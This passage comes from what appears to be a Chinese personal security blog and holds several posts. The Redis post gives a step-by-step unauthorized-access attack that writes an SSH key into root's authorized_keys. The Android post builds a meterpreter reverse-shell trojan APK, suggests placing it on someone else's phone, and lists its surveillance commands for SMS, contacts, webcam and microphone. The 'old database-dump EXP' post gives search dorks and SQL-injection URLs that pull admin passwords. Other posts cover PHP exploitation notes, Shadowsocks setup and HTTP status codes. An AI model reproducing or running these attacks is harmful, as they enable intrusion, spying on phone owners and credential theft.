<h3 id="LIBXML"><a href="#LIBXML" class="headerlink" title="LIBXML"></a>LIBXML</h3><p>libxml 2.9以前的版本默认支持并开启了外部实体的引用，服务端解析用户提交的 xml 文件时未对 xml 文件引用的外部实体（含外部普通实体和外部参数实体）做合适的处理，会导致XXE。</p>
<h3 id="MEMCACHE"><a href="#MEMCACHE" class="headerlink" title="MEMCACHE"></a>MEMCACHE</h3><p><a href="http://blog.nsfocus.net/memcache-unauthorized-access-exploit/" target="_blank" rel="noopener">Memcache未授权访问漏洞利用及修复</a></p>
<h3 id="REDIS"><a href="#REDIS" class="headerlink" title="REDIS"></a>REDIS</h3><p>redis也不用多说了吧</p>
<h3 id="SESSION"><a href="#SESSION" class="headerlink" title="SESSION"></a>SESSION</h3><p>主要是序列化的一些问题<br><img src="https://i.loli.net/2019/11/11/DaISomhEFGnvPVT.png" alt="7g4402ghe1.png"><br>序列化处理器不一致导致对象注入:<br>当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据。所以可以通过Session Upload Progress来设置session。<br>具体可看：<a href="https://seaii-blog.com/index.php/2017/09/12/70.html" target="_blank" rel="noopener">https://seaii-blog.com/index.php/2017/09/12/70.html</a></p>
<h3 id="OPCACHE"><a href="#OPCACHE" class="headerlink" title="OPCACHE"></a>OPCACHE</h3><p>当开启了opcache并可以上传文件时，可以在本地生成一个与服务器文件名相同的文件，并生成缓存文件xx.php.bin。上传后恶意缓存文件会将服务器上的原文件覆盖，从而getshell。</p>
<p>需要将缓存文件的system_id和timestamp两个字段为服务器上文件的值。<br>system_id可以使用工具<a href="https://github.com/GoSecure/php7-opcache-override修改。" target="_blank" rel="noopener">https://github.com/GoSecure/php7-opcache-override修改。</a></p>
<h3 id="IMAP"><a href="#IMAP" class="headerlink" title="IMAP"></a>IMAP</h3><p><a href="https://github.com/vulhub/vulhub/blob/master/php/CVE-2018-19518/README.md" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/php/CVE-2018-19518/README.md</a></p>
<hr>
<p>另外发一个小工具：<a href="https://github.com/proudwind/phpinfo_scanner" target="_blank" rel="noopener">https://github.com/proudwind/phpinfo_scanner</a><br>这个能自动抓取phpinfo把有用的信息给呈现出来</p>
]]></content>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis服务（6379端口）入侵</title>
    <url>/2018/11/01/Redis%E6%9C%8D%E5%8A%A1%EF%BC%886379%E7%AB%AF%E5%8F%A3%EF%BC%89%E5%85%A5%E4%BE%B5/</url>
    <content><![CDATA[<h3 id="一：安装gcc编译环境（有就不用装了）"><a href="#一：安装gcc编译环境（有就不用装了）" class="headerlink" title="一：安装gcc编译环境（有就不用装了）"></a>一：安装gcc编译环境（有就不用装了）</h3><a id="more"></a><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install gcc</span><br><span class="line">apt-get install g++</span><br></pre></td></tr></table></figure>
<h3 id="二：安装redis服务（有就不用装了）"><a href="#二：安装redis服务（有就不用装了）" class="headerlink" title="二：安装redis服务（有就不用装了）"></a>二：安装redis服务（有就不用装了）</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget http://download.redis.io/releases/redis-2.8.17.tar.gz</span><br><span class="line">tar xzf redis-4.0.10.tar.gz </span><br><span class="line">cd redis-4.0.10/</span><br><span class="line">make &amp;amp;&amp;amp; make install</span><br></pre></td></tr></table></figure>
<p>安装到这里就可以了，不需要安装服务端，只要客户端就好了。</p>
<h3 id="三：生成ssh公钥"><a href="#三：生成ssh公钥" class="headerlink" title="三：生成ssh公钥"></a>三：生成ssh公钥</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh-keygen</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2019/11/11/2ZfPlExUrKJOtoC.png" alt="cf2d31f0-cb50-407f-a322-5565f2ffe5e2-image.png"></p>
<p>如图，这个3个地方都是回车就好，不需要输入什么其他的东西的。</p>
<p>之后就是百度的东西了</p>
<h3 id="四：入侵redis"><a href="#四：入侵redis" class="headerlink" title="四：入侵redis"></a>四：入侵redis</h3><ul>
<li>先连接redis看看</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">telnet 192.168.88.136 6379</span><br><span class="line">redis-cli -h 192.168.88.136</span><br></pre></td></tr></table></figure>
<p>telnet的这个命令，它的显示是这样的：<br><img src="https://i.loli.net/2019/11/11/3tyCjfKkUdqL58v.png" alt="0e55a104-6ca5-4500-9faf-451e3a48ebc2-image.png"></p>
<p>这个奇怪的东西是告诉你“按 ctrl + ] 可以变正常…..！ ”<br>不管上面那个，按了之后再quit退出来吧，只要知道能连接就好了，如下图：</p>
<p><img src="https://i.loli.net/2019/11/11/VgXEAc1G5sPovaK.png" alt="feb9334e-a6df-42fb-b9e6-96b5955cb125-image.png"></p>
<p>然后redis-cli的那个命令也是一样的，能连接就可以了</p>
<p><img src="https://i.loli.net/2019/11/11/sWyh28BnjRvV4Zx.png" alt="8d194620-40f1-4469-90c9-9eeee615bd04-image.png"></p>
<p>接下来：</p>
<ul>
<li>清一下redis数据库</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis-cli -h 192.168.88.136 flushall</span><br></pre></td></tr></table></figure>

<ul>
<li>向redis写自己的公钥</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat id_rsa.pub | redis-cli -h 192.168.88.136 -x set redis</span><br></pre></td></tr></table></figure>
<p>开始生成的公钥也就是id_rsa.pub文件在~/.ssh/文件夹里面，自己把它cope出来或者就在那个/.ssh</p>
<p>/目录执行命令也行</p>
<ul>
<li>利用redis写入到文件中</li>
</ul>
<p>连接redis</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis-cli -h 192.168.88.136</span><br></pre></td></tr></table></figure>
<p>查看keys</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">192.168.88.136&gt; keys *</span><br></pre></td></tr></table></figure>
<p>写入配置库的路径及存放位置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">192.168.88.136&gt; CONFIG SET dir /root/.ssh/</span><br></pre></td></tr></table></figure>
<p>写入配置库名称及存放的名字</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">192.168.88.136&gt; CONFIG SET dbfilename &quot;authorized_keys&quot;</span><br></pre></td></tr></table></figure>
<p>保存</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">192.168.88.136&gt; save</span><br></pre></td></tr></table></figure>
<p>退出</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">192.168.88.136&gt; exit</span><br></pre></td></tr></table></figure>
<p>OK！远程连接一下服务器吧！</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh root@192.168.88.136</span><br></pre></td></tr></table></figure>


<p>参考链接：<a href="https://www.secpulse.com/archives/61101.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/61101.html</a></p>
]]></content>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>shadowsocks</title>
    <url>/2018/10/15/shadowsocks/</url>
    <content><![CDATA[<p>本文第一部分叙述在linux服务器上搭建shadowsocks服务端和在windows或linux上搭建shadowsocks客户端。第二部分叙述在linux服务器上搭建proxychains服务的心得。第三部分是2018/11/28更新在windows服务器上搭建shadowsocks服务端。</p><a id="more"></a>
<h2 id="第一部分："><a href="#第一部分：" class="headerlink" title="第一部分："></a>第一部分：</h2><p>（1）：在linux服务器上搭建shadowsocks服务器<br>这里的linux服务器呢，主要是以CentOS、Debian/Ubuntu居多，而且是需要国外的，这样才能通向国外的网，上google之类的翻墙。其实命令上都是差不多的，主要是看服务器的版本，今天我一开始用的CentOS6的，奈何上面只有python2.6。然后我又更新成pyhthon2.7，还要下载wget命令、xz命令，累的半死。结果最后直接换成centos7的服务器就好了，直接现成的PYthon2.7。安装pip之类的很方便<br>废话不多说，命令如下：</p>
<p>1.确认自己的服务器python版本，终端下输入如下命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python （回显是2.6的要记得换成2.7）</span><br></pre></td></tr></table></figure>
<p>2.安装pip</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install python-pip</span><br><span class="line">或者</span><br><span class="line">curl &quot;https://bootstrap.pypa.io/get-pip.py&quot; -o &quot;get-pip.py&quot;</span><br><span class="line">python get-pip.py</span><br><span class="line">或者</span><br><span class="line">sudo yum install epel-release</span><br><span class="line">sudo yum -y install python-pip</span><br></pre></td></tr></table></figure>
<p>（有的系统不是用aot-get而是yum。自己分辨一下，这一步主要是安装pip）</p>
<p>3.升级pip</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install --upgrade pip</span><br><span class="line">或者</span><br><span class="line">sudo pip install --upgrade pip</span><br><span class="line">（这一步不是关键，但是能升级的还是升级一下）</span><br><span class="line">安装好pip之后可以用过如下命令查看版本：</span><br><span class="line">pip -v</span><br></pre></td></tr></table></figure>
<p>4.安装shadowsocks</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install shadowsocks</span><br><span class="line">或者</span><br><span class="line">sudo pip install --upgrade pip</span><br></pre></td></tr></table></figure>
<p>（都是一样的命令，安装好之后会显示Complete！或success啥的）<br>安装好shadowsocks之后就要配置文件了</p>
<p>5.配置shadowsocks文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir /etc/shadowsocks            //在etc下创建shadowsocks文件夹</span><br><span class="line">vim /etc/shadowsocks/config.json       //创建配置文件</span><br><span class="line">第5步按照网上的常规方法有个坑，那就是直接在etc下创建一个shadowsocks.json的文件，但是我今天尝试的时候失败了，没有用，还是创建config.json文件管用点。</span><br></pre></td></tr></table></figure>

<p>6.在config.json文件中写入以下内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123; </span><br><span class="line">      &quot;server&quot;:&quot;server_ip&quot;,         //server_ip写上0.0.0.0或者自己服务器的外网IP都可以，但是不能写127.0.0.1</span><br><span class="line">      &quot;server_port&quot;:8001,             //网上有说过写低端口号网速会快，但是，我今天被大佬说了，还是写高端口号。比如我就写的8001</span><br><span class="line">      &quot;local_address&quot;: &quot;127.0.0.1&quot;,    //不用动</span><br><span class="line">      &quot;local_port&quot;:1080,               //不用动</span><br><span class="line">      &quot;password&quot;:&quot;password&quot;,          //password写上自己回头用客户端连接时需要用的密码</span><br><span class="line">       &quot;timeout&quot;:300,                  //不用动</span><br><span class="line">      &quot;method&quot;:&quot;rc4-md5&quot;,            //大佬说如果是放在路由器上的话可以写成aes-256-cfb，但是自己一般用的话就换成rc4-md5加密方法</span><br><span class="line">      &quot;fast_open&quot;: false                //不用动</span><br><span class="line">   &#125; </span><br><span class="line"></span><br><span class="line">// 单用户，就直接按上面的来就好了，有多个用户的话就用下面的。。</span><br><span class="line">   &#123;</span><br><span class="line">       &quot;server&quot;:&quot;server_ip&quot;,     //一样的，服务器外网IP</span><br><span class="line">       &quot;port_password&quot;:&#123;</span><br><span class="line">           &quot;port_1&quot;:&quot;pwd1&quot;,       //这里写成&quot;端口&quot;：&quot;密码&quot;的形式</span><br><span class="line">           &quot;port_2&quot;:&quot;pwd2&quot;,        //比如：&quot;8001&quot;:&quot;password123&quot;</span><br><span class="line">           &quot;port_3&quot;:&quot;pwd3&quot;         //&quot;8002&quot;:&quot;password456&quot;</span><br><span class="line">       &#125;,</span><br><span class="line">       &quot;local_address&quot;:&quot;127.0.0.1&quot;,   //一样不用动</span><br><span class="line">       &quot;local_port&quot;:1080,               //不动</span><br><span class="line">       &quot;timeout&quot;:300,                  //不动</span><br><span class="line">       &quot;method&quot;:&quot;aes-256-cfb&quot;           //自己用就rc4-md5，如果放路由器的话就aes...</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>如果你们在纠结服务器IP和端口怎么写的话，其实这个问题我一开始也在纠结，服务器IP很好理解就是你的国外服务器的公网IP地址，端口就随便一个端口（不要跟常用服务重复），到时候客户端通过这个端口进行流量的传输而已。密码的话不是你服务器的密码只是你客户端连接时输入的密码。</p>
<p>7.开启和关闭服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssserver -c /etc/shadowsocks/config.json -d start       //开启</span><br><span class="line">ssserver -c /etc/shadowsocks/config.json -d stop        //关闭</span><br></pre></td></tr></table></figure>
<p>然后开启服务就好了，基本上不需要再动什么了。接下来就是客户端的配置了</p>
<h2 id="第二部分：在WINDOWS上安装SHADOWSOCKS客户端"><a href="#第二部分：在WINDOWS上安装SHADOWSOCKS客户端" class="headerlink" title="第二部分：在WINDOWS上安装SHADOWSOCKS客户端"></a>第二部分：在WINDOWS上安装SHADOWSOCKS客户端</h2><p>github链接：<a href="https://github.com/shadowsocks/shadowsocks-windows/releases" target="_blank" rel="noopener">https://github.com/shadowsocks/shadowsocks-windows/releases</a><br><img src="https://i.loli.net/2019/11/11/2KY9kTJbCAZGnBM.png" alt="37ef61a9-06c5-40f1-9e38-8ac7eedcf38c-image.png"></p>
<p>下载就OK了，配置如下：</p>
<p><img src="https://i.loli.net/2019/11/11/STmLeEW5J6Pyvu8.png" alt="f328fd6a-b1a6-422d-ba84-f1e8405e3c50-image.png"></p>
<p>填好你开始在服务端配置的IP，端口，密码就好了，然后配置全局代理，如下图：</p>
<p><img src="https://i.loli.net/2019/11/11/ERNrqcTdaytelkS.png" alt="5beacffd-516b-42b4-9e91-4ba52231ce41-image.png"></p>
<h2 id="第三部分：在LINUX上安装SHADOWSOCKS客户端"><a href="#第三部分：在LINUX上安装SHADOWSOCKS客户端" class="headerlink" title="第三部分：在LINUX上安装SHADOWSOCKS客户端"></a>第三部分：在LINUX上安装SHADOWSOCKS客户端</h2><p>在linux上安装客户端和第一步在服务器上安装服务端是一样的步骤，同样是python2.7环境、安装pip、安装shadowsocks。甚至连config.json文件的创建和配置都是一模一样的。。。<br>唯一的区别在于启动方式不同。客户端启动是如下代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sslocal -c /etc/shadowsocks/config.json    //开启</span><br></pre></td></tr></table></figure>

<p>开启之后就有点想ngrok的运行状态，终端是不能关闭的，关闭了终端就关闭了连接。。。。另外，安装好shadowsocks客户端之后，linux依然是上不了google的，还要设置代理，也就是下一部分</p>
<h3 id="第四部分：安装PROXYCHAINS"><a href="#第四部分：安装PROXYCHAINS" class="headerlink" title="第四部分：安装PROXYCHAINS"></a>第四部分：安装PROXYCHAINS</h3><p>我在其他的linux版本上没有试过，我今天也是在kali里面弄得proxychains，kali里面自带了这个软件，其他的linux系统没有软件的可以自己下载，链接： <a href="https://github.com/rofl0r/proxychains-ng" target="_blank" rel="noopener">https://github.com/rofl0r/proxychains-ng</a><br>kali中配置proxychains：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim /etc/proxychains.conf     //编辑proxychains的配置文件</span><br></pre></td></tr></table></figure>

<p>将文件中最后一样的 socks4 127.0.0.1 9050为socks5 127.0.0.1 1080。。。保存，OK！<br>测试一下：</p>
<p><img src="https://i.loli.net/2019/11/11/YDZbanmUHSRqwzM.png" alt="a71a3fd7-da08-491a-be8b-56be7552c8f2-image.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">proxyresolv www.google.com      //显示什么什么OK就说明可以用了</span><br></pre></td></tr></table></figure>

<p>然后需要翻墙时就在命令最前面加上：proxychains，，，比如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">proxychains msfconsole     //打开MSF</span><br><span class="line">proxychains git clone https://github.com/xxx/xxx      //下载github文件</span><br><span class="line">proxychains firefox     //打开火狐浏览器（这样你用火狐是可以直接翻墙的）</span><br></pre></td></tr></table></figure>

<p>如果觉得太麻烦，每次都要打那么一大串字母，你可以使用proxychains去打开一个终端：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">proxychains zsh</span><br></pre></td></tr></table></figure>

<p>接着在zsh终端里直接输入命令就OK，同样也是翻墙的哦！！！</p>
<hr>
<p>这样一个过程花不了你多久的时间，但却可以给你带来很宝贵的经验，并且也同时打开了一个新世界的大门，想去哪去哪。。。。自己制作翻墙要比下载那些免费VPN要安全的多，网速也要好的多，其中道理我就不讲了。溜了</p>
<hr>
<p>2018/11/28更新： 在windows服务器上搭建shadowsocks服务端</p>
<p>1、首先需要去github上下载集成工具，链接：<a href="https://github.com/shadowsocks/libQtShadowsocks/releases" target="_blank" rel="noopener">https://github.com/shadowsocks/libQtShadowsocks/releases</a> （注意别下载源码包，不然你自己手动编译去）</p>
<p>2、解压出来后是一个shadowsocks-libqss.exe，放到一个文件夹里去，随后在同目录下新建一个config.json的文件，其内容为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;  </span><br><span class="line">        &quot;server&quot;:&quot;0.0.0.0&quot;,  //不动</span><br><span class="line">        &quot;server_port&quot;:8023,  //这里填你要连接的端口</span><br><span class="line">        &quot;local_address&quot;:&quot;127.0.0.1&quot;,  //不动</span><br><span class="line">        &quot;local_port&quot;:1080,  //不动</span><br><span class="line">        &quot;password&quot;:&quot;wyvbboy&quot;,  //密码</span><br><span class="line">        &quot;timeout&quot;:600,  //超时时间，基本不动</span><br><span class="line">        &quot;method&quot;:&quot;aes-256-cfb&quot;,  //协议，见上文</span><br><span class="line">        &quot;http_proxy&quot;: false,  //不动</span><br><span class="line">        &quot;auth&quot;: false  //不动</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>3、在同目录下新建启动文件shadowsocks.bat，其内容为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@echo off  </span><br><span class="line">   shadowsocks-libqss.exe -c config.json -S</span><br></pre></td></tr></table></figure>

<p>4、双击bat文件，会打开一个窗口，之后在客户端连接就好了，服务端的窗口不能关闭，关闭就结束进程了。</p>
<hr>
<p>tips:</p>
<p>1、启动shadowsocks报错，是由于openssl升级到1.1.0以上版本以后弃用了一个函数，具体解决办法是：</p>
<p>用vi打开文件：vi /usr/lib/python2.7/site-packages/shadowsocks/crypto/openssl.py（大概是这个目录，具体看报错）</p>
<p>将第52行libcrypto.EVP_CIPHER_CTX_cleanup.argtypes = (c_void_p,)<br>改为libcrypto.EVP_CIPHER_CTX_reset.argtypes = (c_void_p,)</p>
<p>再次搜索cleanup（全文件共2处，此处位于111行），将libcrypto.EVP_CIPHER_CTX_cleanup(self._ctx)<br>改为libcrypto.EVP_CIPHER_CTX_reset(self._ctx)</p>
<p>保存并退出</p>
<p>2、proxychains不显示多余的信息可以在/etc/proxychains.conf中将以下设置的注释去掉</p>
<p><img src="https://i.loli.net/2019/11/11/FKjvDieQpzHBImC.png" alt="c56604d5-4ac4-43c4-b943-0e8500c9e0d2-image.png"></p>
]]></content>
      <tags>
        <tag>搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透安卓手机</title>
    <url>/2018/06/11/%E6%B8%97%E9%80%8F%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA/</url>
    <content><![CDATA[<p>这篇文章还是在学校的时候写的，原来都这么久了啊，现在看起来一点技术含量都没有。。。</p><a id="more"></a>
<hr>
<p>网上都能找的到的教程，在这里我只是发出来做个保存+分享<br>在kali中，步骤：</p>
<p>输入命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.2.105 LPORT=5555 R &gt; /root/apk.apk</span><br></pre></td></tr></table></figure>

<p>（LHOST填写自己的kali的IP地址、LPORT填写通信端口，可以自己更改 、最后面的路径是生成出APP文件的路径以及文件名）</p>
<p>然后启动msf：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
<p>然后输入命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler //加载模块</span><br><span class="line">set payload android/meterpreter/reverse_tcp //选择Payload</span><br><span class="line">show options //查看参数设置</span><br><span class="line">set LHOST 192.168.1.114 //这里的地址设置成我们刚才生成APP木马的IP地址</span><br><span class="line">set LPORT 5555 //这里的端口设置成刚才我们生成木马所监听的端口</span><br><span class="line">exploit //开始执行漏洞 开始监听,等待手机上线</span><br></pre></td></tr></table></figure>
<p>可以把生成出来的APP放入别人手机中，实验的话把需要的权限都开上吧，打开APP，其实是打不开的，点击一下APP就已经开始工作了。然后便可在kali中输入“？”查看到所有可以执行的命令。</p>
<p>以下是全部命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">核心命令</span><br><span class="line">=============</span><br><span class="line"></span><br><span class="line">     命令                      说明</span><br><span class="line">    -------                   -----------</span><br><span class="line">    ?                         帮助菜单</span><br><span class="line">    background                当前会话</span><br><span class="line">    bgkill                    终止一个meterpreter脚本</span><br><span class="line">    bglist                    列出运行后台脚本</span><br><span class="line">    bgrun                     执行一个meterpreter脚本作为后台线程</span><br><span class="line">    channel                   显示信息或控制活动频道</span><br><span class="line">    close                     关闭频道</span><br><span class="line">    disable_unicode_encoding  禁用unicode字符串的编码</span><br><span class="line">    enable_unicode_encoding   启用unicode字符串的编码</span><br><span class="line">    exit                      终止meterpreter会话</span><br><span class="line">    get_timeouts              获取当前会话超时值</span><br><span class="line">    guid                      获取会话GUID</span><br><span class="line">    help                      帮助菜单</span><br><span class="line">    info                      显示有关Post模块的信息</span><br><span class="line">    irb                       进入irb脚本模式</span><br><span class="line">    load                      加载一个或多个meterpreter扩展</span><br><span class="line">    machine_id                获取连接到会话的计算机的MSF ID</span><br><span class="line">    quit                      终止meterpreter会话</span><br><span class="line">    read                      从频道读取数据</span><br><span class="line">    resource                  运行存储在文件中的命令</span><br><span class="line">    run                       执行meterpreter脚本或Post模块</span><br><span class="line">    sessions                  快速切换到另一个会话</span><br><span class="line">    set_timeouts              设置当前会话超时值</span><br><span class="line">    sleep                     暴力静止Meterpreter会话，然后重新建立会话。</span><br><span class="line">    transport                 更改当前的传输机制</span><br><span class="line">    use                       不推荐使用“load”别名</span><br><span class="line">    uuid                      获取当前会话的UUID</span><br><span class="line">    write                     将数据写入通道</span><br><span class="line"></span><br><span class="line">Stdapi：文件系统命令</span><br><span class="line">============================</span><br><span class="line">     命令          说明</span><br><span class="line">    -------       -----------</span><br><span class="line">    cat           将文件的内容读取到屏幕上</span><br><span class="line">    cd            更改目录</span><br><span class="line">    checksum      检索文件的校验和</span><br><span class="line">    cp            将源复制到目标</span><br><span class="line">    dir           列表文件（ls的别名）</span><br><span class="line">    download      下载文件或目录</span><br><span class="line">    edit          编辑文件</span><br><span class="line">    getlwd        打印本地工作目录</span><br><span class="line">    getwd         打印工作目录</span><br><span class="line">    lcd           更改本地工作目录</span><br><span class="line">    lls           列出本地文件</span><br><span class="line">    lpwd          打印本地工作目录</span><br><span class="line">    ls            列出文件</span><br><span class="line">    mkdir         建立目录</span><br><span class="line">    mv            将源移到目标</span><br><span class="line">    pwd           打印工作目录</span><br><span class="line">    rm            删除指定的文件</span><br><span class="line">    rmdir         删除目录</span><br><span class="line">    search        搜索文件</span><br><span class="line">    upload        上传文件或目录</span><br><span class="line"></span><br><span class="line">Stdapi：网络命令</span><br><span class="line">===========================</span><br><span class="line"></span><br><span class="line">     命令          说明</span><br><span class="line">    -------       -----------</span><br><span class="line">    ifconfig      显示界面</span><br><span class="line">    ipconfig      显示界面</span><br><span class="line">    portfwd       将本地端口转发到远程服务</span><br><span class="line">    route         查看和修改路由表</span><br><span class="line"></span><br><span class="line">Stdapi：系统命令</span><br><span class="line">=======================</span><br><span class="line"></span><br><span class="line">     命令          说明</span><br><span class="line">    -------       -----------</span><br><span class="line">    execute       执行一个命令</span><br><span class="line">    getuid        获取服务器正在运行的用户</span><br><span class="line">    localtime     显示目标系统的本地日期和时间</span><br><span class="line">    pgrep         按名称过滤进程</span><br><span class="line">    ps            列出运行的进程</span><br><span class="line">    shell         放入系统命令外壳</span><br><span class="line">    sysinfo       获取有关远程系统的信息，例如OS</span><br><span class="line"></span><br><span class="line">Stdapi：用户界面命令</span><br><span class="line">===============================</span><br><span class="line"></span><br><span class="line">     命令          说明</span><br><span class="line">    -------       -----------</span><br><span class="line">    screenshot    获取交互式桌面的屏幕截图</span><br><span class="line"></span><br><span class="line">Stdapi：网络摄像头命令</span><br><span class="line">=======================</span><br><span class="line"></span><br><span class="line">     命令           说明</span><br><span class="line">    -------        -----------</span><br><span class="line">    record_mic     从默认麦克风录制音频X秒</span><br><span class="line">    webcam_chat    开始视频聊天</span><br><span class="line">    webcam_list    列出网络摄像头</span><br><span class="line">    webcam_snap    从指定的摄像头拍摄快照</span><br><span class="line">    webcam_stream  从指定的摄像头播放视频流</span><br><span class="line"></span><br><span class="line">Android命令</span><br><span class="line">================</span><br><span class="line">     命令              说明</span><br><span class="line">    -------           -----------</span><br><span class="line">    activity_start    从Uri字符串开始一个Android活动</span><br><span class="line">    check_root        检查设备是否生根</span><br><span class="line">    dump_calllog      获取通话记录</span><br><span class="line">    dump_contacts     获取联系人列表</span><br><span class="line">    dump_sms          获取短信</span><br><span class="line">    geolocate         使用地理位置获取当前的经纬度</span><br><span class="line">    hide_app_icon     隐藏启动器中的应用程序图标</span><br><span class="line">    interval_collect  管理间隔收集功能</span><br><span class="line">    send_sms          从目标会话发送短信</span><br><span class="line">    set_audio_mode    设置振铃模式</span><br><span class="line">    sqlite_query      从存储中查询SQLite数据库</span><br><span class="line">    wakelock          启用/禁用Wakelock</span><br><span class="line">    wlan_geolocate    使用WLAN信息获取当前经纬度</span><br></pre></td></tr></table></figure>

















]]></content>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>老的爆库EXP</title>
    <url>/2018/06/09/%E8%80%81%E7%9A%84%E7%88%86%E5%BA%93EXP/</url>
    <content><![CDATA[<p>第一个：<br>关键字：</p><a id="more"></a>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">inurl:&quot;HomeMarket.asp&quot;</span><br></pre></td></tr></table></figure>
<p>EXP：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/NewsType.asp?SmallClass=&apos;%20union%20select%200,username%2BCHR(124)%2Bpassword,2,3,4,5,6,7,8,9%20from%20admin%20union%20select%20*%20from%20news%20where%201=2%20and%20&apos;&apos;=&apos;’</span><br></pre></td></tr></table></figure>
<p>后台地址：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/admin/index.asp</span><br><span class="line">/admin/login.asp</span><br><span class="line">/admin/admin_login.asp</span><br><span class="line">/manage/index.asp</span><br><span class="line">/manage/login.asp</span><br><span class="line">/manage/admin_login.asp</span><br><span class="line">/admin/index.aspx</span><br><span class="line">/admin/login.aspx</span><br><span class="line">/admin/admin_login.aspx</span><br><span class="line">/manage/index.aspx</span><br><span class="line">/manage/login.aspx</span><br><span class="line">/manage/admin_login.aspx</span><br><span class="line">/admin/index.php</span><br><span class="line">/admin/login.php</span><br><span class="line">/admin/admin_login.php</span><br><span class="line">/manage/index.php</span><br><span class="line">/manage/login.php</span><br><span class="line">/manage/admin_login.php</span><br></pre></td></tr></table></figure>
<p>第二个：<br>关键字：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">有限公司--Powered by ASPCMS 2.0</span><br></pre></td></tr></table></figure>
<p>EXP:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/plug/comment/commentList.asp?id=0%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now%28%29,null,1%20%20frmasterom%20&#123;prefix&#125;user</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTP状态码</title>
    <url>/2018/05/13/HTTP%E7%8A%B6%E6%80%81%E7%A0%81/</url>
    <content><![CDATA[<h3 id="1-信息类-：表示接收到请求并且继续处理"><a href="#1-信息类-：表示接收到请求并且继续处理" class="headerlink" title="1(信息类)：表示接收到请求并且继续处理"></a>1(信息类)：表示接收到请求并且继续处理</h3><a id="more"></a><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">100——客户必须继续发出请求</span><br><span class="line">101——客户要求服务器根据请求转换HTTP协议版本</span><br></pre></td></tr></table></figure>
<h3 id="2-响应成功类-：表示动作被成功接收、理解和接受"><a href="#2-响应成功类-：表示动作被成功接收、理解和接受" class="headerlink" title="2(响应成功类)：表示动作被成功接收、理解和接受"></a>2(响应成功类)：表示动作被成功接收、理解和接受</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">200——表明该请求被成功地完成，所请求的资源发送回客户端</span><br><span class="line">201——提示知道新文件的URL</span><br><span class="line">202——接受和处理、但处理未完成</span><br><span class="line">203——返回信息不确定或不完整</span><br><span class="line">204——请求收到，但返回信息为空</span><br><span class="line">205——服务器完成了请求，用户代理必须复位当前已经浏览过的文件</span><br><span class="line">206——服务器已经完成了部分用户的GET请求</span><br></pre></td></tr></table></figure>
